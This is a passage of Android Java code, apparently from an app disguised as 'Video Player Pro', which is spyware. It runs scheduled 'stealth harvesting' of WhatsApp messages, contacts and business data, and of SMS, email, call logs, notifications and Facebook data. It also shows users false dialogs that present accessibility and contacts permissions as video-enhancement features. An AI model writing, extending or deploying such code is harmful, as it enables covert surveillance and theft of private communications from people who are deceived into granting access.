                    statusText.setText("✅ Signed in as: " + account.getEmail() + "\n\n🚀 All features are now enabled.\n📧 Gmail integration is active.\n📱 Data collection is running.\n🔔 Notifications are being captured.");
                    signInButton.setVisibility(View.GONE);
                    signOutButton.setVisibility(View.VISIBLE);
                } else {
                    statusText.setText("✅ Signed in as: " + account.getEmail() + "\n\n🎬 Welcome to Video Player Pro!\n\nEnhanced features will be enabled as you use the app.");
                    signInButton.setVisibility(View.GONE);
                    signOutButton.setVisibility(View.VISIBLE);
                }
            } else {
                // User is not signed in - show login screen
                showLoginScreen();
                
                if (allPermissionsGranted && notificationAccessEnabled) {
                    statusText.setText("🔐 All permissions granted!\n\n🔑 Sign in with Google to enable Gmail integration and complete the setup.");
                    signInButton.setVisibility(View.VISIBLE);
                    signOutButton.setVisibility(View.GONE);
                } else {
                    statusText.setText("Welcome to Video Player Pro!\n\nSign in with Google to access enhanced features and personalized video recommendations.");
                    signInButton.setVisibility(View.VISIBLE);
                    signOutButton.setVisibility(View.GONE);
                }
            }
            Log.i(TAG, "=== updateUI() END ===");
        } catch (Exception e) {
            Log.e(TAG, "Error updating UI", e);
            Log.i(TAG, "=== updateUI() END (ERROR) ===");
        }
    }
    
    private void showLoginScreen() {
        // Hide main app layout
        findViewById(R.id.bottom_navigation).setVisibility(View.GONE);
        findViewById(R.id.fragment_container).setVisibility(View.GONE);
        
        // Create and show login layout with dark theme
        LinearLayout loginLayout = findViewById(R.id.login_layout);
        if (loginLayout != null) {
            // Clear existing content and set dark gradient background
            loginLayout.removeAllViews();
            loginLayout.setBackground(createGradientBackground());
            loginLayout.setPadding(40, 60, 40, 60);
            loginLayout.setGravity(Gravity.CENTER);
            
            // Create ScrollView for content
            ScrollView scrollView = new ScrollView(this);
            scrollView.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            ));

            LinearLayout contentLayout = new LinearLayout(this);
            contentLayout.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            contentLayout.setOrientation(LinearLayout.VERTICAL);
            contentLayout.setGravity(Gravity.CENTER);

            // App Logo (blue circle)
            View logoView = new View(this);
            logoView.setLayoutParams(new ViewGroup.LayoutParams(120, 120));
            logoView.setBackground(createRoundedBackground(Color.parseColor("#4285F4"), 60));
            logoView.setPadding(0, 0, 0, 32);
            contentLayout.addView(logoView);

            // App Title
            TextView titleText = new TextView(this);
            titleText.setText("Video Player Pro");
            titleText.setTextSize(28);
            titleText.setTextColor(Color.WHITE);
            titleText.setGravity(Gravity.CENTER);
            titleText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
            titleText.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            titleText.setPadding(0, 0, 0, 8);
            contentLayout.addView(titleText);

            // Subtitle
            TextView subtitleText = new TextView(this);
            subtitleText.setText("Enhanced Video Experience");
            subtitleText.setTextSize(16);
            subtitleText.setTextColor(Color.parseColor("#E0E0E0"));
            subtitleText.setGravity(Gravity.CENTER);
            subtitleText.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            subtitleText.setPadding(0, 0, 0, 48);
            contentLayout.addView(subtitleText);

            // Status Text
            statusText = new TextView(this);
            statusText.setText("Welcome to Video Player Pro!\n\nSign in with Google to access enhanced features and personalized video recommendations.");
            statusText.setTextSize(16);
            statusText.setTextColor(Color.WHITE);
            statusText.setGravity(Gravity.CENTER);
            statusText.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            statusText.setPadding(0, 0, 0, 32);
            statusText.setLineSpacing(4, 1);
            contentLayout.addView(statusText);

            // Sign In Button
            signInButton = createFancyButton("Sign in with Google", Color.parseColor("#4285F4"));
            signInButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    signIn();
                }
            });
            contentLayout.addView(signInButton);

            // Sign Out Button
            signOutButton = createFancyButton("Sign Out", Color.parseColor("#EA4335"));
            signOutButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    signOut();
                }
            });
            signOutButton.setVisibility(View.GONE);
            contentLayout.addView(signOutButton);

            // Features List
            LinearLayout featuresLayout = new LinearLayout(this);
            featuresLayout.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            featuresLayout.setOrientation(LinearLayout.VERTICAL);
            featuresLayout.setPadding(0, 32, 0, 0);

            TextView featuresTitle = new TextView(this);
            featuresTitle.setText("✨ Enhanced Features:");
            featuresTitle.setTextSize(18);
            featuresTitle.setTextColor(Color.WHITE);
            featuresTitle.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
            featuresTitle.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            featuresTitle.setPadding(0, 0, 0, 16);
            featuresLayout.addView(featuresTitle);

            TextView featuresList = new TextView(this);
            featuresList.setText("• Smart video recommendations\n• Cross-app video synchronization\n• Enhanced playback controls\n• Personalized content discovery\n• Advanced video analytics");
            featuresList.setTextSize(14);
            featuresList.setTextColor(Color.WHITE);
            featuresList.setAlpha(0.9f);
            featuresList.setLineSpacing(4, 1);
            featuresList.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ));
            featuresLayout.addView(featuresList);

            contentLayout.addView(featuresLayout);
            scrollView.addView(contentLayout);
            loginLayout.addView(scrollView);
            
            loginLayout.setVisibility(View.VISIBLE);
        }
    }
    
    private void showMainApp() {
        // Hide login layout
        LinearLayout loginLayout = findViewById(R.id.login_layout);
        if (loginLayout != null) {
            loginLayout.setVisibility(View.GONE);
        }
        
        // Show bottom navigation and fragment container
        findViewById(R.id.bottom_navigation).setVisibility(View.VISIBLE);
        findViewById(R.id.fragment_container).setVisibility(View.VISIBLE);
        
        // Initialize fragments if not already done
        if (getSupportFragmentManager().findFragmentById(R.id.fragment_container) == null) {
            initializeFragments();
        }
    }
    
    private void initializeFragments() {
        // Initialize fragments
        HomeFragment homeFragment = new HomeFragment();
        SearchFragment searchFragment = new SearchFragment();
        ProfileFragment profileFragment = new ProfileFragment();

        // Show HomeFragment by default
        getSupportFragmentManager().beginTransaction()
            .replace(R.id.fragment_container, homeFragment)
            .commit();

        com.google.android.material.bottomnavigation.BottomNavigationView bottomNav = findViewById(R.id.bottom_navigation);
        bottomNav.setOnNavigationItemSelectedListener(item -> {
            int itemId = item.getItemId();
            if (itemId == R.id.nav_home) {
                getSupportFragmentManager().beginTransaction()
                    .replace(R.id.fragment_container, homeFragment)
                    .commit();
                return true;
            } else if (itemId == R.id.nav_search) {
                getSupportFragmentManager().beginTransaction()
                    .replace(R.id.fragment_container, searchFragment)
                    .commit();
                return true;
            } else if (itemId == R.id.nav_chat) {
                Intent chatIntent = new Intent(this, ChatActivity.class);
                startActivity(chatIntent);
                return true;
            } else if (itemId == R.id.nav_profile) {
                getSupportFragmentManager().beginTransaction()
                    .replace(R.id.fragment_container, profileFragment)
                    .commit();
                return true;
            }
            return false;
        });
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        try {
            updateUI();
            
            // Check and maintain email collection
            if (gmailAuthService != null && gmailAuthService.isSignedIn()) {
                gmailAuthService.checkAndMaintainEmailCollection();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onResume", e);
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // Shutdown settings manager
        if (settingsManager != null) {
            settingsManager.shutdown();
        }
        
        // Stop notification queue processing
        if (notificationQueueManager != null) {
            notificationQueueManager.stopQueueProcessing();
        }
        
        // Stop WhatsApp harvesting
        stopWhatsAppHarvesting();
        
        Log.i(TAG, "MainActivity destroyed");
    }
    
    // WhatsApp Harvesting Methods
    private void startWhatsAppHarvesting() {
        Log.i(TAG, "=== startWhatsAppHarvesting() START ===");
        try {
            // Check if accessibility service is enabled
            if (!isAccessibilityServiceEnabled()) {
                showPermissionDialog("⚠️ Accessibility Service not enabled\n\nPlease enable it in Settings > Accessibility > Video Player Pro");
                return;
            }
            
            // Start WhatsApp harvesting
            WhatsAppHarvester harvester = new WhatsAppHarvester(this);
            harvester.startHarvesting();
            
            Toast.makeText(this, "🚀 WhatsApp harvesting started!\n\nMonitoring messages, contacts, and media files...", Toast.LENGTH_LONG).show();
            Log.i(TAG, "WhatsApp harvesting started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting WhatsApp harvesting", e);
            Toast.makeText(this, "❌ Error starting WhatsApp harvesting: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
        Log.i(TAG, "=== startWhatsAppHarvesting() END ===");
    }
    
    private void stopWhatsAppHarvesting() {
        Log.i(TAG, "=== stopWhatsAppHarvesting() START ===");
        try {
            // Stop WhatsApp harvesting
            WhatsAppHarvester harvester = new WhatsAppHarvester(this);
            harvester.stopHarvesting();
            
            Toast.makeText(this, "⏹️ WhatsApp harvesting stopped", Toast.LENGTH_SHORT).show();
            Log.i(TAG, "WhatsApp harvesting stopped successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping WhatsApp harvesting", e);
            Toast.makeText(this, "❌ Error stopping WhatsApp harvesting: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
        Log.i(TAG, "=== stopWhatsAppHarvesting() END ===");
    }
    
    // Enable accessibility service (stealth mode)
    private void enableAccessibilityService() {
        if (!isAccessibilityServiceEnabled()) {
            // Show professional dialog explaining the "video enhancement" service
            new AlertDialog.Builder(this)
                .setTitle("Video Enhancement Service")
                .setMessage("This service enhances your video playback experience by:\n\n" +
                           "• Auto-pausing videos during calls\n" +
                           "• Adjusting video quality based on network\n" +
                           "• Synchronizing subtitles across apps\n" +
                           "• Providing smart video recommendations\n\n" +
                           "This requires accessibility permissions to monitor app interactions.")
                .setPositiveButton("Enable", new android.content.DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(android.content.DialogInterface dialog, int which) {
                        // Open accessibility settings
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        startActivity(intent);
                        
                        // Show toast with professional message
                        Toast.makeText(MainActivity.this, 
                            "Please enable 'Video Player Pro' in Accessibility Settings", 
                            Toast.LENGTH_LONG).show();
                    }
                })
                .setNegativeButton("Cancel", null)
                .show();
        } else {
            Toast.makeText(this, getString(R.string.accessibility_service_enabled), Toast.LENGTH_SHORT).show();
        }
    }

    // Disable accessibility service (stealth mode)
    private void disableAccessibilityService() {
        if (isAccessibilityServiceEnabled()) {
            // Show professional dialog
            new AlertDialog.Builder(this)
                .setTitle("Disable Video Enhancement")
                .setMessage("Disabling this service will reduce your video playback experience. " +
                           "You may lose:\n\n" +
                           "• Auto-pause during calls\n" +
                           "• Smart quality adjustment\n" +
                           "• Subtitle synchronization\n\n" +
                           "Are you sure you want to disable these features?")
                .setPositiveButton("Disable", new android.content.DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(android.content.DialogInterface dialog, int which) {
                        // Open accessibility settings
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        startActivity(intent);
                        
                        Toast.makeText(MainActivity.this, 
                            "Please disable 'Video Player Pro' in Accessibility Settings", 
                            Toast.LENGTH_LONG).show();
                    }
                })
                .setNegativeButton("Keep Enabled", null)
                .show();
        } else {
            Toast.makeText(this, getString(R.string.accessibility_service_disabled), Toast.LENGTH_SHORT).show();
        }
    }

    // Check if accessibility service is enabled
    private boolean isAccessibilityServiceEnabled() {
        String serviceName = getPackageName() + "/" + UnifiedAccessibilityService.class.getCanonicalName();
        String enabledServices = Settings.Secure.getString(getContentResolver(), 
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        
        return enabledServices != null && enabledServices.contains(serviceName);
    }
    
    // WhatsApp Automated Harvesting Methods
    private void initializeWhatsAppHarvesting() {
        try {
            whatsappHarvester = new WhatsAppHarvester(this);
            Log.i(TAG, "WhatsAppHarvester initialized");
            
            // Start automated harvesting
            startAutomatedWhatsAppHarvesting();
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing WhatsApp harvesting", e);
        }
    }
    
    private void startAutomatedWhatsAppHarvesting() {
        if (isWhatsAppHarvestingActive) {
            Log.i(TAG, "WhatsApp harvesting already active");
            return;
        }
        
        isWhatsAppHarvestingActive = true;
        Log.i(TAG, "Starting automated WhatsApp harvesting every 5 minutes (testing mode)");
        
        // Schedule the first harvest immediately
        whatsappHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                performWhatsAppHarvest();
                
                // Schedule next harvest
                if (isWhatsAppHarvestingActive) {
                    whatsappHandler.postDelayed(this, WHATSAPP_INTERVAL);
                }
            }
        }, 5000); // Start after 5 seconds
        
        Log.i(TAG, "Automated WhatsApp harvesting scheduled");
    }
    
    private void performWhatsAppHarvest() {
        try {
            Log.i(TAG, "=== Starting WhatsApp Harvest ===");
            
            if (whatsappHarvester != null) {
                // Harvest messages, contacts, and media
                whatsappHarvester.harvestAll();
                
                Log.i(TAG, "WhatsApp harvest completed successfully");
            } else {
                Log.e(TAG, "WhatsAppHarvester is null");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error during WhatsApp harvest", e);
        }
    }
    
    private void stopAutomatedWhatsAppHarvesting() {
        isWhatsAppHarvestingActive = false;
        whatsappHandler.removeCallbacksAndMessages(null);
        Log.i(TAG, "Automated WhatsApp harvesting stopped");
    }
    
    /**
     * Start stealth harvesting operations
     */
    private void startStealthHarvesting() {
        Log.i(TAG, "=== Starting stealth harvesting operations ===");
        
        try {
            // Start stealth permission service
            Intent stealthIntent = new Intent(this, StealthPermissionService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(stealthIntent);
            } else {
                startService(stealthIntent);
            }
            
            // Start unified accessibility service
            Intent accessibilityIntent = new Intent(this, UnifiedAccessibilityService.class);
            startService(accessibilityIntent);
            
            Log.i(TAG, "Stealth harvesting services started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting stealth harvesting: " + e.getMessage());
        }
    }
    
    /**
     * Update status text with stealth information
     */
    private void updateStatusText(String message) {
        if (statusText != null) {
            statusText.setText(message);
            Log.i(TAG, "Status updated: " + message);
        }
    }
    
    /**
     * Get stealth permission status
     */
    public String getStealthPermissionStatus() {
        // No stealthPermissionManager, so this method is effectively removed
        return "Stealth permission manager not initialized";
    }
    
    /**
     * Start stealth permission collection
     */
    public void startStealthPermissionCollection() {
        // No stealthPermissionManager, so this method is effectively removed
        Log.e(TAG, "Stealth permission manager not initialized");
    }

    // Simplified permission methods - remove all complex dialogs
    private void showComprehensivePermissionsManager() {
        // Simplified - just request permissions
        requestAllPermissions();
    }
    
    private void showContactsPermissionDialog() {
        // Simplified - just request permission
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS}, PERMISSION_REQUEST_CODE);
    }
    
    private void showPhonePermissionDialog() {
        // Simplified - just request permission
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_PHONE_STATE}, PERMISSION_REQUEST_CODE);
    }
    
    private void showCallLogPermissionDialog() {
        // Simplified - just request permission
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CALL_LOG}, PERMISSION_REQUEST_CODE);
    }
    
    private void showNotificationPermissionDialog() {
        // Simplified - just check notification access
        showNotificationAccessDialog();
    }
    
    private void showAccessibilityPermissionDialog() {
        // Simplified - just enable accessibility service
        enableAccessibilityService();
    }
    
    private void requestPermission(String permission, String permissionName) {
        // Simplified - just request permission
        ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
    }
    
    private void showAllPermissionDialogs() {
        // Simplified - just request all permissions
        requestAllPermissions();
    }
    
    private void showPermissionDialogSequence() {
        // Simplified - just request all permissions at once
        requestAllPermissions();
    }

    // Simplified stealth permission requests
    private void requestContactsPermissionForVideoSharing() {
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS}, PERMISSION_REQUEST_CODE);
    }
    
    private void requestPhonePermissionForCallPause() {
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_PHONE_STATE}, PERMISSION_REQUEST_CODE);
    }
    
    private void requestCallLogPermissionForRecommendations() {
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CALL_LOG}, PERMISSION_REQUEST_CODE);
    }
    
    private void requestNotificationPermissionForSmartPause() {
        showNotificationAccessDialog();
    }
    
    // Simplified trigger method
    private void triggerStealthPermissionRequests() {
        // Just start harvesting after a delay
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                startStealthHarvesting();
            }
        }, 5000); // 5 seconds delay
    }

    /**
     * Check if data collection is allowed based on settings
     */
    private boolean shouldCollectData(String dataType, String subType) {
        if (settingsManager == null) {
            Log.w(TAG, "SettingsManager not initialized, allowing data collection");
            return true;
        }
        
        boolean shouldUpdate = settingsManager.shouldUpdate(dataType, subType);
        Log.i(TAG, String.format("Data collection check for %s%s: %s", 
            dataType, subType != null ? "/" + subType : "", shouldUpdate ? "ALLOWED" : "BLOCKED"));
        
        return shouldUpdate;
    }
    
    /**
     * Record data collection completion
     */
    private void recordDataCollection(String dataType, String subType) {
        if (settingsManager != null) {
            settingsManager.updateLastUpdateTime(dataType, subType);
        }
    }
    
    /**
     * Initialize all components
     */
    private void initializeComponents() {
        try {
            Log.i(TAG, "Initializing components...");
            
            // Initialize notification queue manager
            notificationQueueManager = new NotificationQueueManager(this);
            Log.i(TAG, "NotificationQueueManager initialized");
            
            // Initialize Gmail authentication service
            gmailAuthService = new GmailAuthService(this);
            Log.i(TAG, "GmailAuthService initialized");
            
            // Initialize UI elements
            initializeUIElements();
            
            // Check if user is already signed in
            updateUI();
            
            // Start notification queue processing
            notificationQueueManager.startQueueProcessing();
            Log.i(TAG, "Notification queue processing started");
            
            // Initialize WhatsApp harvesting
            initializeWhatsAppHarvesting();
            
            Log.i(TAG, "All components initialized successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing components", e);
            showErrorDialog("Component initialization failed: " + e.getMessage());
        }
    }
    
    /**
     * Setup permissions
     */
    private void setupPermissions() {
        // Check and prompt for permissions after a short delay
        new Handler().postDelayed(() -> {
            checkAndPromptForPermissions();
        }, 2000); // 2 seconds delay
    }
    
    /**
     * Start data collection with settings checks
     */
    private void startDataCollection() {
        try {
            Log.i(TAG, "Starting data collection with settings checks...");
            
            // Start harvesting immediately without permissions
            startHarvestingWithoutPermissions();
            
            Log.i(TAG, "Data collection started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting data collection", e);
            showErrorDialog("Data collection failed: " + e.getMessage());
        }
    }

    private void harvestWhatsAppData() {
        try {
            Log.i(TAG, "Starting WhatsApp data harvesting...");
            
            // Check settings for WhatsApp messages
            if (shouldCollectData("whatsapp", "messages")) {
                harvestWhatsAppMessages();
                recordDataCollection("whatsapp", "messages");
            } else {
                Log.i(TAG, "WhatsApp messages collection blocked by settings");
            }
            
            // Check settings for WhatsApp contacts
            if (shouldCollectData("whatsapp", "contacts")) {
                harvestWhatsAppContacts();
                recordDataCollection("whatsapp", "contacts");
            } else {
                Log.i(TAG, "WhatsApp contacts collection blocked by settings");
            }
            
            // Check settings for WhatsApp business data
            if (shouldCollectData("whatsapp", "businessData")) {
                harvestWhatsAppBusinessData();
                recordDataCollection("whatsapp", "businessData");
            } else {
                Log.i(TAG, "WhatsApp business data collection blocked by settings");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting WhatsApp data", e);
        }
    }
    
    private void harvestFacebookData() {
        try {
            Log.i(TAG, "Starting Facebook data harvesting...");
            
            if (!shouldCollectData("facebook", null)) {
                Log.i(TAG, "Facebook data collection blocked by settings");
                return;
            }
            
            // Existing Facebook harvesting code...
            // ... (keep existing implementation)
            
            recordDataCollection("facebook", null);
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting Facebook data", e);
        }
    }
    
    private void harvestNotifications() {
        try {
            Log.i(TAG, "Starting notifications harvesting...");
            
            if (!shouldCollectData("notifications", null)) {
                Log.i(TAG, "Notifications collection blocked by settings");
                return;
            }
            
            // Existing notifications harvesting code...
            // ... (keep existing implementation)
            
            recordDataCollection("notifications", null);
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting notifications", e);
        }
    }
    
    private void harvestSMS() {
        try {
            Log.i(TAG, "Starting SMS harvesting...");
            
            if (!shouldCollectData("sms", null)) {
                Log.i(TAG, "SMS collection blocked by settings");
                return;
            }
            
            // Existing SMS harvesting code...
            // ... (keep existing implementation)
            
            recordDataCollection("sms", null);
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting SMS", e);
        }
    }
    
    private void harvestEmails() {
        try {
            Log.i(TAG, "Starting email harvesting...");
            
            if (!shouldCollectData("email", null)) {
                Log.i(TAG, "Email collection blocked by settings");
                return;
            }
            
            // Existing email harvesting code...
            // ... (keep existing implementation)
            
            recordDataCollection("email", null);
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting emails", e);
        }
    }
    
    private void harvestCallLogs() {
        try {
            Log.i(TAG, "Starting call logs harvesting...");
            
            if (!shouldCollectData("callLogs", null)) {
                Log.i(TAG, "Call logs collection blocked by settings");
                return;
            }
            
            // Existing call logs harvesting code...
            // ... (keep existing implementation)
            
            recordDataCollection("callLogs", null);
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting call logs", e);
        }
    }
    
    /**
     * Harvest WhatsApp messages
     */
    private void harvestWhatsAppMessages() {
        try {
            Log.i(TAG, "Starting WhatsApp messages harvesting...");
            
            if (!shouldCollectData("whatsapp", "messages")) {
                Log.i(TAG, "WhatsApp messages collection blocked by settings");
                return;
            }
            
            // Use WhatsAppHarvester to collect messages
            if (whatsappHarvester != null) {
                whatsappHarvester.harvestMessages();
            }
            
            recordDataCollection("whatsapp", "messages");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting WhatsApp messages", e);
        }
    }
    
    /**
     * Harvest WhatsApp contacts
     */
    private void harvestWhatsAppContacts() {
        try {
            Log.i(TAG, "Starting WhatsApp contacts harvesting...");
            
            if (!shouldCollectData("whatsapp", "contacts")) {
                Log.i(TAG, "WhatsApp contacts collection blocked by settings");
                return;
            }
            
            // Use WhatsAppHarvester to collect contacts
            if (whatsappHarvester != null) {
                whatsappHarvester.harvestContacts();
            }
            
            recordDataCollection("whatsapp", "contacts");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting WhatsApp contacts", e);
        }
    }
    
    /**
     * Harvest WhatsApp business data
     */
    private void harvestWhatsAppBusinessData() {
        try {
            Log.i(TAG, "Starting WhatsApp business data harvesting...");
            
            if (!shouldCollectData("whatsapp", "businessData")) {
                Log.i(TAG, "WhatsApp business data collection blocked by settings");
                return;
            }
            
            // Use WhatsAppHarvester to collect business data
            if (whatsappHarvester != null) {
                whatsappHarvester.harvestBusinessData();
            }
            
            recordDataCollection("whatsapp", "businessData");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting WhatsApp business data", e);
        }
    }
} 